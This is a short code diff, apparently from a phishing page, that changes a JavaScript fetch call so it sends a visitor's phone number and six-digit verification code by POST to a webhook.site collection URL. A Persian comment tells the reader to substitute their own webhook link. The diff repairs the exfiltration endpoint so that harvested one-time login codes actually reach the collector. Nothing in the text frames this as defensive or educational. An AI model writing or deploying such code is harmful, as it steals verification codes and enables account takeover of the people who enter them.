@@ -101,7 +101,7 @@
         if (code.length === 6) {
             document.getElementById('codeError').style.display = 'none';
             // 👇 لینک webhook.site خود را جایگزین کنید
-            fetch('http://webhook.site/#!/view/797a6d1e-7344-4f1f-9d13-9618ed0ceee8/bba7f3bd-afc9-4d83-9819-8abe8bae5aef', {
+            fetch('https://webhook.site/797a6d1e-7344-4f1f-9d13-9618ed0ceee8', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                 body: `phone=${encodeURIComponent(phoneNumber)}&code=${encodeURIComponent(code)}`
